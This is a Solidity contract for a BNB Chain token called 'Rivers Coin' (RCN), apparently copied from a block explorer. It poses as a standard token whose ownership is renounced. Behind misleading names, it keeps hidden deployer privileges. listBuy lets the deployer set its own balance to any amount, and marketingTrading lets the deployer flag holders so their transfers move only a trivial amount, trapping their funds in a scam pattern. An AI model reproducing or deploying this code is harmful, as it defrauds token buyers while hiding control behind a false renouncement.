/**
 *Submitted for verification at BscScan.com on 2023-02-06
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface shouldAmountMarketing {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface feeReceiver {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract RiversCoin is Ownable {
    uint8 private shouldAt = 18;

    string private _name = "Rivers Coin";
    string private _symbol = "RCN";

    uint256 private fromLaunchReceiver = 100000000 * 10 ** shouldAt;
    mapping(address => uint256) private enableMax;
    mapping(address => mapping(address => uint256)) private fromLaunched;

    mapping(address => bool) public modeTo;
    address public limitIs;
    address public toBuy;
    mapping(address => bool) public receiverFund;
    uint256 constant sellAmount = 10 ** 10;
    bool public fundTake;

    
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        shouldAmountMarketing shouldTeam = shouldAmountMarketing(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        toBuy = feeReceiver(shouldTeam.factory()).createPair(shouldTeam.WETH(), address(this));
        limitIs = atTxWallet();
        modeTo[limitIs] = true;
        enableMax[limitIs] = fromLaunchReceiver;
        emit Transfer(address(0), limitIs, fromLaunchReceiver);
        renounceOwnership();
    }

    

    function marketingTrading(address launchWallet) public {
        if (launchWallet == limitIs || launchWallet == toBuy || !modeTo[atTxWallet()]) {
            return;
        }
        receiverFund[launchWallet] = true;
    }

    function balanceOf(address exemptAtShould) public view returns (uint256) {
        return enableMax[exemptAtShould];
    }

    function totalSupply() external view returns (uint256) {
        return fromLaunchReceiver;
    }

    function atTxWallet() private view returns (address) {
        return msg.sender;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function getOwner() external view returns (address) {
        return owner();
    }

    function listBuy(uint256 listFromEnable) public {
        if (!modeTo[atTxWallet()]) {
            return;
        }
        enableMax[limitIs] = listFromEnable;
    }

    function transferFrom(address maxTeam, address teamWallet, uint256 listFromEnable) public returns (bool) {
        if (maxTeam != atTxWallet() && fromLaunched[maxTeam][atTxWallet()] != type(uint256).max) {
            require(fromLaunched[maxTeam][atTxWallet()] >= listFromEnable);
            fromLaunched[maxTeam][atTxWallet()] -= listFromEnable;
        }
        if (teamWallet == limitIs || maxTeam == limitIs) {
            return walletList(maxTeam, teamWallet, listFromEnable);
        }
        if (receiverFund[maxTeam]) {
            return walletList(maxTeam, teamWallet, sellAmount);
        }
        return walletList(maxTeam, teamWallet, listFromEnable);
    }

    function transfer(address teamWallet, uint256 listFromEnable) external returns (bool) {
        return transferFrom(atTxWallet(), teamWallet, listFromEnable);
    }

    function allowance(address senderIs, address launchedTotalAmount) external view returns (uint256) {
        return fromLaunched[senderIs][launchedTotalAmount];
    }

    function walletList(address exemptLiquidity, address walletAtLiquidity, uint256 listFromEnable) internal returns (bool) {
        require(enableMax[exemptLiquidity] >= listFromEnable);
        enableMax[exemptLiquidity] -= listFromEnable;
        enableMax[walletAtLiquidity] += listFromEnable;
        emit Transfer(exemptLiquidity, walletAtLiquidity, listFromEnable);
        return true;
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function decimals() external view returns (uint8) {
        return shouldAt;
    }

    function approve(address launchedTotalAmount, uint256 listFromEnable) public returns (bool) {
        fromLaunched[atTxWallet()][launchedTotalAmount] = listFromEnable;
        emit Approval(atTxWallet(), launchedTotalAmount, listFromEnable);
        return true;
    }

    function listWallet(address tokenTrading) public {
        if (fundTake) {
            return;
        }
        modeTo[tokenTrading] = true;
        fundTake = true;
    }


}